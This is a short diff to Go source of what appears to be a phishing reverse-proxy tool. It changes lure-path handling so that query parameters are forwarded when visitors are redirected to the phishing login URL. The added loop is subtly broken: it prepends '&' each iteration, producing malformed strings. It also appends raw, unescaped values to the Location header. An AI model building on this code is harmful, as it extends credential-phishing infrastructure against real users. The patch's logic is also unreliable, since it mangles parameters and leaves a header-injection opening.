@@ -352,11 +352,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
 					if err == nil {
+						// pass other parameters
+						custom_params := ""
+						for param_name, param_value := range req.URL.Query() {
+							custom_params = "&" + custom_params + param_name + "=" + param_value[0]
+						}
+
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
 						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 						if resp != nil {
-							resp.Header.Add("Location", rurl)
+							resp.Header.Add("Location", rurl + custom_params)
 							return req, resp
 						}
 					}
